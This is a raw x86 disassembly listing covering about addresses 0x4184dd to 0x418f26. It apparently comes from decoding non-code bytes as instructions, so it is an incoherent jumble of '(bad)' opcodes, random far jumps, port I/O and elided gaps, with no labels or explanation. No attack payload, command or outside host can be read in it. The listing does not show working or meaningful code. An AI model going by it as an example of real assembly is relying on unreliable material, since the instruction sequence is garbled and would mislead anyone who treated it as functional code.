  4184dd:	cmp    eax,0x9893088b
  4184e2:	sar    BYTE PTR [esi-0x44],1
  4184e5:	inc    esp
  4184e6:	adc    BYTE PTR [esi-0x6b],cl
  4184e9:	fisub  WORD PTR [ecx+ebp*1]
  4184ec:	cmp    DWORD PTR [edx+0x29],edi
  4184ef:	out    0xd7,al
  4184f1:	std    
  4184f2:	ss jp  0x4184cd
  4184f5:	xchg   esi,eax
  4184f6:	dec    esi
  4184f7:	jmp    0x4184f9
  4184f9:	sbb    al,0x95
  4184fb:	aaa    
  4184fc:	sub    BYTE PTR [eax],dl
  4184fe:	loopne 0x418527
  418500:	(bad)  
  418501:	pop    ebp
  418502:	cld    
  418503:	and    eax,0x7e19707d
  418508:	cs dec edi
  41850a:	rcr    BYTE PTR [ecx+0x6f],0xb2
  41850e:	test   DWORD PTR [esi],eax
	...
  418574:	inc    ecx
  418575:	stc    
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	call   0x101:0x98be0d89
  418587:	add    BYTE PTR [ecx+eax*1],al
  41858a:	add    BYTE PTR [eax],al
  41858c:	mov    DWORD PTR [edx+0x5ae99aed],ebx
  418592:	jns    0x4185e5
  418594:	fwait
  418595:	mov    esi,0x91278c56
  41859a:	jo     0x4185f9
  41859c:	adc    edx,DWORD PTR [eax+ecx*2+0x4ad491d8]
  4185a3:	enter  0xbe12,0x57
  4185a7:	adc    DWORD PTR [ebx],ebp
  4185a9:	add    ch,ah
  4185ab:	pop    ebp
  4185ac:	jne    0x4435e47f
  4185b2:	push   ecx
  4185b3:	cdq    
  4185b4:	pop    ss
  4185b5:	das    
  4185b6:	or     eax,0xbb255228
  4185bb:	jbe    0x418639
  4185bd:	imul   edx,DWORD PTR [ebx+0x8],0xe4243e49
  4185c4:	xchg   ebp,eax
  4185c5:	dec    ecx
  4185c6:	mov    edi,0xe6abfb5a
  4185cb:	dec    edi
  4185cc:	mov    edi,?
  4185ce:	pop    ebx
  4185cf:	xor    al,0x97
  4185d1:	(bad)  [eax+0x51]
  4185d4:	sub    ch,BYTE PTR [eax+0x1a]
  4185d7:	test   dl,0xfb
  4185da:	or     DWORD PTR [edx],0x2d5b094d
  4185e0:	lods   eax,DWORD PTR ds:[esi]
  4185e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185e2:	xchg   ecx,eax
  4185e3:	mov    ds:0xf089976b,al
  4185e8:	sub    edi,DWORD PTR [esi-0x485a3841]
  4185ee:	mov    ebx,0x659dae2f
  4185f3:	js     0x4185dc
  4185f5:	pop    eax
  4185f6:	jmp    0xcff3:0x2f450f7e
  4185fd:	pop    ebx
  4185fe:	inc    ebx
  4185ff:	mov    ds:0x7adf300,eax
  418604:	mov    ds:0xc20e4b8b,eax
  418609:	jmp    0x418615
  41860b:	mov    edi,0x6c7bc1e4
  418610:	mov    ds:0x226b1ca,al
  418615:	add    eax,0xafc5a31d
  41861a:	aaa    
  41861b:	std    
  41861c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41861d:	bound  ecx,QWORD PTR gs:[ebp-0x7e]
  418621:	push   edi
  418622:	stc    
  418623:	cmp    eax,0xe03e57d7
  418628:	xchg   esp,eax
  418629:	(bad)  
  41862a:	mov    esp,0xe62e1dec
  41862f:	mov    eax,0x46d0be39
  418634:	in     al,0x2b
  418636:	add    ah,cl
  418638:	mov    ds:0x42b4cbbc,al
  41863d:	xor    al,0x84
  41863f:	ss pop es
  418641:	outs   dx,BYTE PTR fs:[esi]
  418643:	mov    al,0x6b
  418645:	sbb    al,0xc
  418647:	push   esp
  418648:	enter  0x63e9,0xb7
  41864c:	ja     0x4185cf
  41864e:	dec    ecx
  41864f:	(bad)
  418652:	ror    BYTE PTR [ecx-0x2c04a8fb],1
  418658:	ja     0x4186c1
  41865a:	jecxz  0x4185ff
  41865c:	adc    al,0x36
  41865e:	and    edx,DWORD PTR [ebx]
  418660:	aaa    
  418661:	inc    edi
  418662:	cmc    
  418663:	or     BYTE PTR [esi],bl
  418665:	and    edi,DWORD PTR [esi-0x76d5b9d6]
  41866b:	pop    edx
  41866c:	stos   BYTE PTR es:[edi],al
  41866d:	not    ah
  41866f:	jmp    0x4186ad
  418671:	mov    ecx,0x1e367fc2
  418676:	ss jecxz 0x418689
  418679:	fdivr  DWORD PTR [eax]
  41867b:	cli    
  41867c:	or     bh,bh
  41867e:	aaa    
  41867f:	shl    al,1
  418681:	and    eax,0xe7ee6f9
  418686:	and    esi,DWORD PTR [edx-0xa2b8c56]
  41868c:	iret   
  41868d:	das    
  41868e:	inc    edx
  41868f:	add    DWORD PTR [eax],eax
	...
  4186f1:	add    BYTE PTR [eax],al
  4186f3:	add    BYTE PTR [ebx-0x44c35fd8],dl
  4186f9:	mov    esp,0x8d0caf9f
  4186fe:	cmp    edx,edx
  418700:	add    eax,esi
  418702:	mov    ds:0x1029cb0,al
  418707:	add    BYTE PTR [ecx+eax*1],al
  41870a:	add    BYTE PTR [eax],al
  41870c:	sbb    DWORD PTR [edi],0xc3d1cef4
  418712:	dec    eax
  418713:	imul   ebp
  418715:	repz in eax,0xed
  418718:	pop    ebx
  418719:	addr16 retf 
  41871b:	mov    bh,0xdb
  41871d:	dec    ecx
  41871e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41871f:	mov    eax,ds:0xd68c683c
  418724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418725:	fcmovnu st,st(0)
  418727:	loopne 0x41870d
  418729:	xchg   bh,ah
  41872b:	pop    es
  41872c:	mov    al,ds:0x10ad09cc
  418731:	mov    edx,0x722c826a
  418736:	in     eax,dx
  418737:	or     edx,DWORD PTR [edx-0x3f]
  41873a:	xor    BYTE PTR [eax+edi*8],al
  41873d:	aad    0x15
  41873f:	mov    edi,0xfb3d6b76
  418744:	jg     0x41873b
  418746:	or     eax,0x3f
  418749:	dec    ecx
  41874a:	mov    dh,0xc9
  41874c:	mov    ecx,ss
  41874e:	jno    0x418771
  418750:	inc    esp
  418751:	xor    ah,BYTE PTR [eax-0x35]
  418754:	xor    eax,0x42750d95
  418759:	jmp    0xccc1:0x9b4aa229
  418760:	test   BYTE PTR [edx+eiz*8-0x4],al
  418764:	and    ecx,esi
  418766:	pop    ebp
  418767:	push   edi
  418768:	inc    eax
  418769:	push   0x7ef2cb89
  41876e:	sub    DWORD PTR [ebx-0x5fde4f11],ecx
  418774:	mov    al,0xd2
  418776:	and    BYTE PTR [ecx+0x17b9602f],0xaa
  41877d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41877e:	sti    
  41877f:	xchg   ebx,eax
  418780:	mov    ss,WORD PTR [edx+0x2ea168a3]
  418786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418787:	add    eax,0xdf64e59
  41878c:	jle    0x418774
  41878e:	dec    ebx
  41878f:	xlat   BYTE PTR ds:[ebx]
  418790:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418791:	scas   eax,DWORD PTR es:[edi]
  418792:	pop    esi
  418793:	inc    edi
  418794:	inc    edi
  418795:	xor    bl,al
  418797:	push   0xf75ad656
  41879c:	mov    dl,0xaa
  41879e:	ss in  eax,0xa1
  4187a1:	xor    ah,bh
  4187a3:	or     BYTE PTR [eax],ch
  4187a5:	in     eax,0x4c
  4187a7:	data16 loopne 0x41878d
  4187aa:	call   0xe98a8ab6
  4187af:	clc    
  4187b0:	cmp    cl,BYTE PTR [edx]
  4187b2:	mov    bl,0xc3
  4187b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187b5:	dec    ebx
  4187b6:	xor    ebx,ebp
  4187b8:	pop    es
  4187b9:	push   es
  4187ba:	repz sub DWORD PTR [esi+0x2d],ebx
  4187be:	xchg   esp,eax
  4187bf:	imul   eax,esp,0xffffffe8
  4187c2:	mov    ebp,DWORD PTR [eax-0x2c]
  4187c5:	(bad)  
  4187c6:	jmp    0x2b58:0x5825f7c8
  4187cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187ce:	(bad)  [eax+0x3b]
  4187d1:	sub    ch,BYTE PTR [edi-0x42]
  4187d4:	test   eax,0x8fc10811
  4187d9:	pop    ebx
  4187da:	outs   dx,BYTE PTR ds:[esi]
  4187db:	pop    ebp
  4187dc:	mov    edx,0xe6a2a395
  4187e1:	pop    edi
  4187e2:	or     al,0x25
  4187e4:	outs   dx,BYTE PTR ds:[esi]
  4187e5:	xchg   esi,eax
  4187e6:	iret   
  4187e7:	enter  0xafda,0x38
  4187eb:	add    ebp,DWORD PTR [edi-0x2e01bb1]
  4187f1:	retf   0xbed6
  4187f4:	pop    edx
  4187f5:	push   cs
  4187f6:	cmp    esi,DWORD PTR [eax+0x30afb476]
  4187fc:	push   esi
  4187fd:	fmul   DWORD PTR [esi-0x27]
  418800:	add    bl,BYTE PTR [ebx-0xb]
  418803:	int3   
  418804:	repz sub DWORD PTR [ecx-0x30b6a0f5],esp
  41880b:	sbb    ebp,esi
  41880d:	outs   dx,BYTE PTR ds:[esi]
  41880e:	fcomp  st(2)
	...
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi+0x199c3acd]
  418881:	and    ecx,ecx
  418883:	mov    al,ds:0x4000103
  418889:	add    DWORD PTR [eax],eax
  41888b:	add    BYTE PTR [edi+ebp*4+0xb],ch
  41888f:	pushf  
  418890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418891:	mov    esi,0x737aae1
  418896:	and    DWORD PTR [edx],edx
  418898:	not    DWORD PTR [eax-0x2cd0b9e9]
  41889e:	pop    bx
  4188a1:	push   esp
  4188a2:	clc    
  4188a3:	psrld  mm2,QWORD PTR [esi-0x6fbc7657]
  4188aa:	imul   ecx,eax,0x7c
  4188ad:	call   0x155d:0xb6f76792
  4188b4:	inc    edx
  4188b5:	jb     0x418848
  4188b7:	push   esp
  4188b8:	inc    ebp
  4188b9:	movntq (bad),mm1
  4188ba:	out    0xcd,eax
  4188bc:	xor    al,0xfd
  4188be:	mov    ch,0xb0
  4188c0:	iret   
  4188c1:	shl    BYTE PTR [edi],0x5e
  4188c4:	adc    esi,DWORD PTR [ebx-0x5bb41827]
  4188ca:	jle    0x41889a
  4188cc:	aam    0x11
  4188ce:	(bad)  
  4188cf:	sar    DWORD PTR [ebx+0x1423c69b],0x3d
  4188d6:	sahf   
  4188d7:	inc    esp
  4188d8:	imul   edx,DWORD PTR [ebx+0x4c],0xffffff84
  4188dc:	xchg   esi,eax
  4188dd:	cmp    eax,0xc327913b
  4188e2:	jp     0x418940
  4188e4:	and    BYTE PTR [edx+0x60],dl
  4188e7:	js     0x4188ca
  4188e9:	add    dh,bh
  4188eb:	aam    0x48
  4188ed:	bound  ebx,QWORD PTR [eax+edi*1-0x30]
  4188f1:	pop    edx
  4188f2:	test   BYTE PTR [edx-0x35ec5245],0x70
  4188f9:	outs   dx,BYTE PTR ds:[esi]
  4188fa:	jp     0x418929
  4188fc:	dec    ebp
  4188fd:	js     0x41895b
  4188ff:	cdq    
  418900:	fwait
  418901:	out    0x1c,eax
  418903:	fcomp  DWORD PTR [eax]
  418905:	mov    edx,0x18c18c12
  41890a:	jno    0x4188c8
  41890c:	push   cs
  41890d:	cmp    al,0xff
  41890f:	sub    dl,bh
  418911:	add    eax,edx
  418913:	iret   
  418914:	sub    eax,0x807081d4
  418919:	dec    eax
  41891a:	ret    0x19b8
  41891d:	xor    eax,0xd74e09
  418922:	dec    esi
  418923:	enter  0xc8de,0x6e
  418927:	adc    BYTE PTR [esi+0x2d],0x3c
  41892b:	retf   0x78df
  41892e:	xchg   edx,eax
  41892f:	cmp    dl,BYTE PTR [ecx+0x2c]
  418932:	fist   DWORD PTR [esi+ebp*8-0xc]
  418936:	inc    esp
  418937:	scas   eax,DWORD PTR es:[edi]
  418938:	mov    al,0xcb
  41893a:	dec    esi
  41893b:	push   edi
  41893c:	arpl   WORD PTR [esi],bx
  41893e:	das    
  41893f:	in     eax,0x7a
  418941:	outs   dx,DWORD PTR ds:[esi]
  418942:	(bad)  
  418943:	mov    bl,0x4c
  418945:	inc    edx
  418946:	lea    edi,[ebp+0x1c0d79b1]
  41894c:	mov    edx,0x6805db5
  418951:	sbb    BYTE PTR [ebx+eiz*2],dh
  418954:	or     al,0xac
  418956:	xor    dh,BYTE PTR [edi+ecx*4]
  418959:	push   0xffffffb3
  41895b:	std    
  41895c:	inc    ebx
  41895d:	inc    edi
  41895e:	pop    ss
  41895f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418960:	push   edi
  418961:	mov    ah,0xb8
  418963:	into   
  418964:	add    ah,BYTE PTR [esi-0x17]
  418967:	mov    dh,0xda
  418969:	and    al,0xaa
  41896b:	shr    BYTE PTR [ebp+0x1d],0x57
  41896f:	dec    esi
  418970:	sbb    DWORD PTR [ebx+0x1920b23d],ebp
  418976:	aaa    
  418977:	(bad)  
  418978:	pop    ss
  418979:	jg     0x4189a1
  41897b:	popa   
  41897c:	(bad)  
  41897d:	outs   dx,BYTE PTR ds:[esi]
  41897e:	jle    0x41892b
  418980:	sbb    BYTE PTR [edi+0x1a],ah
  418983:	(bad)
  418986:	leave  
  418987:	dec    esi
  418988:	loopne 0x41890b
  41898a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41898b:	jge    0x4189f3
  41898d:	adc    al,BYTE PTR [edi]
  41898f:	fld    DWORD PTR [eax]
	...
  4189f1:	add    BYTE PTR [eax],al
  4189f3:	add    BYTE PTR [ecx+edx*4-0x28a2e9ac],cl
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0x75e83d69
  418a03:	mov    ah,0xa4
  418a05:	add    al,0x1
  418a07:	add    BYTE PTR [ecx+eax*1],al
  418a0a:	add    BYTE PTR [eax],al
  418a0c:	sbb    al,0xf4
  418a0e:	inc    ecx
  418a0f:	inc    esp
  418a10:	pop    edx
  418a11:	adc    al,0x77
  418a13:	adc    DWORD PTR [ebp+0x2f],esi
  418a16:	test   DWORD PTR [edi+0x2d7bab27],0xfff01239
  418a20:	outs   dx,BYTE PTR ds:[esi]
  418a21:	clc    
  418a22:	xchg   BYTE PTR [ebx+0x78],dl
  418a25:	jae    0x4189cc
  418a27:	mov    cs,WORD PTR [ebx-0x4062d925]
  418a2d:	and    ah,bh
  418a2f:	add    esp,edi
  418a31:	shl    DWORD PTR [edi+0x24],cl
  418a34:	push   eax
  418a35:	jp     0x418a25
  418a37:	iret   
  418a38:	(bad)  
  418a3a:	or     DWORD PTR [eax-0x24e2d2fe],esi
  418a40:	sbb    DWORD PTR [edi-0x68],ecx
  418a43:	mov    al,ds:0x4ffed7e0
  418a48:	dec    esi
  418a49:	xchg   edi,eax
  418a4a:	cmp    BYTE PTR [edx+0x32df2712],0x1a
  418a51:	add    edi,ebp
  418a53:	mov    bh,0x5
  418a55:	div    BYTE PTR [esi]
  418a57:	jno    0x4189f1
  418a59:	jecxz  0x418a72
  418a5b:	ss test dh,cl
  418a5e:	loopne 0x418ad9
  418a60:	cmp    eax,ebx
  418a62:	inc    esp
  418a63:	dec    ebp
  418a64:	jne    0x418ae5
  418a66:	out    0x7c,eax
  418a68:	inc    ebp
  418a69:	and    eax,0x60601b66
  418a6e:	dec    edx
  418a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a70:	pop    es
  418a71:	sbb    ch,ah
  418a73:	mov    al,dl
  418a75:	push   eax
  418a76:	frstor [eax+0xd]
  418a79:	xchg   edi,eax
  418a7a:	fidiv  DWORD PTR [eax+eax*4-0x6]
  418a7e:	jns    0x418afa
  418a80:	cmp    BYTE PTR [edi+edx*2],bh
  418a83:	sub    al,0x7d
  418a85:	sbb    al,0x2d
  418a87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a88:	dec    esp
  418a89:	add    ebx,DWORD PTR [esi-0x23]
  418a8c:	sub    bl,dh
  418a8e:	and    cl,BYTE PTR [ebp+0x2d]
  418a91:	imul   ebx,DWORD PTR [edi-0x6009609f],0xd69d7665
  418a9b:	retf   0xf001
  418a9e:	mov    eax,ds:0x95c2dcae
  418aa3:	adc    eax,0x6359e95c
  418aa8:	mov    esi,0xa8a7c4e5
  418aad:	cmp    al,0xc
  418aaf:	xor    BYTE PTR [edi+ebx*8+0x6ceb8dd4],bh
  418ab6:	out    0xf9,al
  418ab8:	stos   DWORD PTR es:[edi],eax
  418ab9:	lods   al,BYTE PTR ds:[esi]
  418aba:	xor    edi,DWORD PTR [eax]
  418abc:	outs   dx,BYTE PTR ds:[esi]
  418abd:	push   es
  418abe:	jae    0x418aeb
  418ac0:	sub    eax,0x58c66d96
  418ac5:	test   DWORD PTR [ecx-0x1a61df69],ebp
  418acb:	sbb    BYTE PTR [eax+0x240b15eb],ch
  418ad1:	jmp    0x418a55
  418ad3:	test   al,0x2a
  418ad5:	dec    ebp
  418ad6:	adc    eax,0xc1f68d5d
  418adb:	fisubr DWORD PTR [eax+edx*2-0x9]
  418adf:	cmp    edx,esp
  418ae1:	fwait
  418ae2:	pop    eax
  418ae3:	loopne 0x418ae2
  418ae5:	add    eax,0xf91c0fc9
  418aea:	xlat   BYTE PTR ds:[ebx]
  418aeb:	outs   dx,DWORD PTR ds:[esi]
  418aec:	or     bl,dl
  418aee:	mov    al,ds:0x3e2b19fa
  418af3:	jecxz  0x418a78
  418af5:	cwde   
  418af6:	sub    BYTE PTR cs:[edi],dh
  418af9:	mov    ds:0x7229d426,al
  418afe:	fcom   DWORD PTR [edx]
  418b00:	repz fidiv DWORD PTR [ebp+0x7ffcbeb3]
  418b07:	mov    BYTE PTR [ebx],bl
  418b09:	mov    al,0xbb
  418b0b:	dec    eax
  418b0c:	stos   DWORD PTR es:[edi],eax
  418b0d:	jp     0x418b21
  418b0f:	aas    
	...
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x47
  418b81:	or     ecx,0x68
  418b84:	test   al,0x5
  418b86:	add    DWORD PTR [eax],eax
  418b88:	add    al,0x1
  418b8a:	add    BYTE PTR [eax],al
  418b8c:	push   esi
  418b8d:	add    BYTE PTR [edi-0x624e2524],al
  418b93:	adc    eax,0x7eab581a
  418b98:	ret    0xbcc8
  418b9b:	mov    cs,WORD PTR [edx]
  418b9d:	daa    
  418b9e:	adc    ebp,ebx
  418ba0:	jp     0x418b66
  418ba2:	cdq    
  418ba3:	sbb    eax,0xfa8745b3
  418ba8:	in     eax,0x15
  418baa:	dec    esp
  418bab:	fsub   DWORD PTR [ecx+0x3a30609d]
  418bb1:	lea    ecx,ds:0xe77abf86
  418bb7:	or     eax,0xac8e08ae
  418bbc:	mov    ebp,0x585b0657
  418bc1:	scas   al,BYTE PTR es:[edi]
  418bc2:	jp     0x418b87
  418bc4:	or     ebp,esp
  418bc6:	aad    0xf0
  418bc8:	xor    al,0x1e
  418bca:	fisub  DWORD PTR [ebp+0x16fc7f1d]
  418bd0:	call   0x2281:0xeb3bc570
  418bd7:	xor    bl,BYTE PTR [eax-0x6c]
  418bda:	and    DWORD PTR [eax],eax
  418bdc:	xchg   ecx,eax
  418bdd:	jnp    0x418c5d
  418bdf:	push   esp
  418be0:	std    
  418be1:	bound  edi,QWORD PTR [ebx+0x72]
  418be4:	rol    DWORD PTR [ebp-0x286f5d5c],1
  418bea:	aam    0x86
  418bec:	sahf   
  418bed:	xchg   ebx,eax
  418bee:	ror    BYTE PTR [edx+0x65],1
  418bf1:	jnp    0x418c03
  418bf3:	fsubr  DWORD PTR [edx-0x3a1e862f]
  418bf9:	lds    edi,FWORD PTR [esi+esi*8+0x14]
  418bfd:	sbb    BYTE PTR [eax+0x54],0xc8
  418c01:	in     eax,dx
  418c02:	daa    
  418c03:	inc    ebp
  418c04:	and    eax,DWORD PTR [eax]
  418c06:	mov    WORD PTR [edx-0x61],ds
  418c09:	mov    ds:0x83300af9,eax
  418c0e:	jno    0x418c74
  418c10:	aam    0x3e
  418c12:	mov    cl,dh
  418c14:	in     al,0x79
  418c16:	mov    ecx,DWORD PTR [edi+0x57487e81]
  418c1c:	xor    BYTE PTR [esi-0x7424f042],0x2b
  418c23:	(bad)  
  418c24:	out    0xef,al
  418c26:	popa   
  418c27:	or     dl,dl
  418c29:	xchg   dx,ax
  418c2b:	xchg   edx,eax
  418c2c:	push   0x4047c0a1
  418c31:	sub    eax,0xe9449806
  418c36:	adc    eax,0xa776e30c
  418c3b:	mov    ch,0x54
  418c3d:	jmp    0x418cb5
  418c3f:	xchg   esp,eax
  418c40:	mov    esp,DWORD PTR [ebp-0x376f3436]
  418c46:	out    dx,eax
  418c47:	jo     0x418c2f
  418c49:	push   ebp
  418c4a:	cmp    BYTE PTR [ebp-0x599590f2],dh
  418c50:	ret    
  418c51:	pop    es
  418c52:	cmp    al,0xe7
  418c54:	scas   eax,DWORD PTR es:[edi]
  418c55:	or     al,0x9f
  418c57:	icebp  
  418c58:	das    
  418c59:	inc    eax
  418c5a:	(bad)  
  418c5b:	dec    edx
  418c5c:	mov    cl,0x48
  418c5e:	pop    edx
  418c5f:	or     al,0x36
  418c61:	into   
  418c62:	inc    ebp
  418c63:	mov    esp,0xb1f3901f
  418c68:	(bad)  
  418c69:	push   0x7c
  418c6b:	out    dx,al
  418c6c:	push   0x14
  418c6e:	xlat   BYTE PTR ds:[ebx]
  418c6f:	lds    esp,FWORD PTR [ebp+0x8]
  418c72:	push   0x38
  418c74:	jle    0x418c51
  418c76:	or     al,0x5e
  418c78:	clc    
  418c79:	jmp    0x418c15
  418c7b:	push   es
  418c7c:	xor    DWORD PTR [ebp+0x7fdb404a],esi
  418c82:	jb     0x418cb5
  418c84:	xor    BYTE PTR [eax+0x31],cl
  418c87:	in     al,0xac
  418c89:	sub    eax,0xbf3863e1
  418c8e:	jl     0x418cf6
	...
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	sar    dh,cl
  418d01:	nop
  418d02:	lods   eax,DWORD PTR ds:[esi]
  418d03:	out    0xac,eax
  418d05:	push   es
  418d06:	add    DWORD PTR [eax],eax
  418d08:	add    al,0x1
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	or     BYTE PTR [edi],dh
  418d0e:	adc    al,BYTE PTR [ecx-0x35ce6662]
  418d14:	out    0xb3,eax
  418d16:	push   eax
  418d17:	mov    bl,0xb0
  418d19:	lea    ecx,[esi]
  418d1b:	sub    ecx,ecx
  418d1d:	pop    ebx
  418d1e:	sub    ebx,DWORD PTR [edi]
  418d20:	call   0x59e4:0xb79acd2f
  418d27:	or     DWORD PTR [ebp-0x4dd791bb],0x433b5b19
  418d31:	mov    eax,ds:0x7ad9f7d4
  418d36:	data16 jo 0x418d58
  418d39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d3a:	sub    DWORD PTR [edi+0x67],ebp
  418d3d:	mov    dh,bl
  418d3f:	ror    ebx,cl
  418d41:	jecxz  0x418d62
  418d43:	mov    WORD PTR [eax+0x15e8cdab],?
  418d49:	cld    
  418d4a:	ss xchg ecx,eax
  418d4c:	push   edi
  418d4d:	ret    0xf388
  418d50:	stos   BYTE PTR es:[edi],al
  418d51:	(bad)  
  418d52:	enter  0x845d,0xbf
  418d56:	dec    edx
  418d57:	aas    
  418d58:	stos   BYTE PTR es:[edi],al
  418d59:	or     DWORD PTR [esi-0x6e5f525c],ebp
  418d5f:	(bad)  
  418d60:	in     eax,0x15
  418d62:	stos   DWORD PTR es:[edi],eax
  418d63:	xor    BYTE PTR [esp+ecx*4],dl
  418d66:	mov    esi,0x49095709
  418d6b:	adc    BYTE PTR [eax],bh
  418d6d:	fsubr  DWORD PTR [edx-0x2914087d]
  418d73:	stos   DWORD PTR es:[edi],eax
  418d74:	je     0x418dda
  418d76:	cmp    al,BYTE PTR [esi+edx*4]
  418d79:	ds sbb ebp,eax
  418d7c:	pop    DWORD PTR [ebx+0x1c]
  418d7f:	jp     0x418dcf
  418d81:	inc    ebp
  418d82:	mov    ds:0x33beb159,eax
  418d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d88:	fisttp QWORD PTR [edx+esi*8-0x4674a4dd]
  418d8f:	outs   dx,DWORD PTR ds:[esi]
  418d90:	aam    0xd7
  418d92:	and    eax,0xddc61ddc
  418d97:	pop    ebp
  418d98:	inc    edi
  418d99:	pop    ebp
  418d9a:	shr    DWORD PTR ds:0xf9236e85,cl
  418da0:	es mov ecx,0xdcd93fed
  418da6:	(bad)
  418da9:	fisub  DWORD PTR [ebx]
  418dab:	sub    DWORD PTR [ebp+0x777cd47e],edx
  418db1:	xchg   BYTE PTR [esi],al
  418db3:	test   al,0x88
  418db5:	push   ebx
  418db6:	stc    
  418db7:	scas   eax,DWORD PTR es:[edi]
  418db8:	push   esi
  418db9:	dec    esi
  418dba:	jge    0x418d77
  418dbc:	xchg   ebp,eax
  418dbd:	xchg   ecx,eax
  418dbe:	push   eax
  418dbf:	push   esi
  418dc0:	xor    DWORD PTR [ecx-0x41],ecx
  418dc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dc4:	les    ebp,FWORD PTR [esi+0x44]
  418dc7:	cdq    
  418dc8:	dec    edx
  418dc9:	cmp    DWORD PTR [eax],esp
  418dcb:	jl     0x418e0e
  418dcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418dce:	cmp    al,dh
  418dd0:	add    DWORD PTR [esi-0x5ea5bd0e],0xb164228a
  418dda:	and    cl,BYTE PTR [edi]
  418ddc:	jae    0x418dac
  418dde:	jne    0x418e4c
  418de0:	callw  0x3e7
  418de4:	jmp    0x83ac:0x22bce5e9
  418deb:	and    dh,BYTE PTR [esi-0x4f]
  418dee:	mov    esi,0xb3f3bdab
  418df3:	add    al,BYTE PTR [ebx+eax*2-0x73]
  418df7:	sbb    dh,BYTE PTR [edi-0x2a]
  418dfa:	pop    edi
  418dfb:	lds    edx,FWORD PTR [ebp+0x7fef4fe1]
  418e01:	mov    ds:0x365d765c,eax
  418e06:	mov    ch,bl
  418e08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e09:	pop    eax
  418e0a:	inc    esi
  418e0b:	pop    ebp
  418e0c:	data16 xlat BYTE PTR fs:[ebx]
  418e0f:	in     al,0x0
	...
  418e71:	add    BYTE PTR [eax],al
  418e73:	add    BYTE PTR [esi],cl
  418e75:	bnd call 0xde7c8aab
  418e7b:	dec    dl
  418e7d:	leave  
  418e7e:	and    ah,BYTE PTR [edx-0x6c]
  418e81:	pushf  
  418e82:	lods   al,BYTE PTR ds:[esi]
  418e83:	(bad)  
  418e84:	mov    al,0x7
  418e86:	add    DWORD PTR [eax],eax
  418e88:	add    al,0x1
  418e8a:	add    BYTE PTR [eax],al
  418e8c:	push   esp
  418e8d:	adc    ecx,DWORD PTR ds:0xe7166971
  418e93:	adc    eax,0x8b27f615
  418e98:	dec    ebp
  418e99:	dec    eax
  418e9a:	sbb    eax,0xcec3a2ce
  418e9f:	xor    eax,0xe4f38796
  418ea4:	push   ecx
  418ea5:	popa   
  418ea6:	loopne 0x418ea8
  418ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ea9:	iret   
  418eaa:	popa   
  418eab:	fbstp  TBYTE PTR [ebp-0x283119ba]
  418eb1:	push   esi
  418eb2:	pop    esp
  418eb3:	add    bl,BYTE PTR [ebp-0x612c10e3]
  418eb9:	ins    BYTE PTR es:[edi],dx
  418eba:	aam    0xc0
  418ebc:	leave  
  418ebd:	mov    eax,ecx
  418ebf:	outs   dx,DWORD PTR ds:[esi]
  418ec0:	ja     0x418e7a
  418ec2:	cmc    
  418ec3:	xor    DWORD PTR [ebx+ecx*8+0x12],eax
  418ec7:	mov    al,0xab
  418ec9:	pop    ebp
  418eca:	lods   al,BYTE PTR ds:[esi]
  418ecb:	jae    0x418ec4
  418ecd:	add    ah,al
  418ecf:	arpl   si,dx
  418ed1:	stc    
  418ed2:	cmp    esp,DWORD PTR [ebp+0x2d65c4ff]
  418ed8:	adc    esp,DWORD PTR [ecx-0xe7cccb0]
  418ede:	xor    bh,BYTE PTR [esi+0x49]
  418ee1:	push   0x7ad4cac0
  418ee6:	repz push ebp
  418ee8:	ja     0x418f25
  418eea:	inc    edx
  418eeb:	push   0x424bb381
  418ef0:	rcr    DWORD PTR [eax],cl
  418ef2:	stos   DWORD PTR es:[edi],eax
  418ef3:	add    al,0x2b
  418ef5:	dec    esp
  418ef6:	(bad)  [ebx+ebp*4]
  418ef9:	inc    eax
  418efa:	fnstcw WORD PTR [ebx]
  418efc:	outs   dx,DWORD PTR ds:[esi]
  418efd:	sub    eax,0xa35a5d0e
  418f02:	mov    ds:0x486f600f,al
  418f07:	shl    DWORD PTR [eax-0x44],1
  418f0a:	arpl   WORD PTR [ebx-0x72],cx
  418f0d:	cld    
  418f0e:	jae    0x418eab
  418f10:	test   al,0x5e
  418f12:	in     eax,dx
  418f13:	push   ebp
  418f14:	jecxz  0x418efc
  418f16:	cmc    
  418f17:	inc    eax
  418f18:	inc    ecx
  418f19:	imul   DWORD PTR [edi-0x6b]
  418f1c:	daa    
  418f1d:	sub    al,0x97
  418f1f:	jmp    0x3269:0x3b0463c1
  418f26:	loop   0x418f21
